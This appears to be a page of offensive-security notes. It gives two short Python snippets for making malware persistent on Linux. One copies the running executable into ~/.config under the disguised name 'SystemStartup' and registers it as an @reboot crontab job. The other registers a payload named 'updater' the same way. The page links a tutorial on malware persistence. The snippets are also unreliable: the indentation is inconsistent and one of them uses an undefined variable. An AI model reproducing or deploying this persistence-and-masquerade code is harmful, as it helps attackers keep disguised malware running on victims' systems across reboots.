# Scripting

## Python

```python
import os
import shutil
from sys import executable

def persistence(payload_name) -> None:
    location = os.path.expanduser('~') + "/.config/" + payload_name
    if not os.path.exists(location):
        # Create the autostart directory if it doesn't exist
        os.makedirs(location)
        filename = os.path.join(location, payload_name)
        # Copy the payload to that new location
        shutil.copyfile(executable, filename)
        # Add the payload to startup via crontab
        crontab_line = f"@reboot {filename}"
        os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')

if __name__ == "__main__":
	masquerade_payload_name = "SystemStartup" # Disguise the payload

    if os.getuid() == 0:
        persistence(masquerade_payload_name)
    else:
        print("Elevated permission is required to copy the payload for persistence!")
```

Another shorter variant.

```python
import os

def persistence(payload_path):
    command = '''(crontab -l 2>/dev/null; echo "@reboot {}") | crontab -'''.format(payload_path)
    os.system(command)

def main():
	payload_name = 'updater'
	payload_path = os.path.join(home_directory, payload_name)
	
	persistence(payload_path)

if __name__ == '__main__':
	main()
```

---
## References

### The Python Code

- [The Python Code: How to Make Malware Persistent in Python](https://thepythoncode.com/article/how-to-create-malware-persistent-in-python)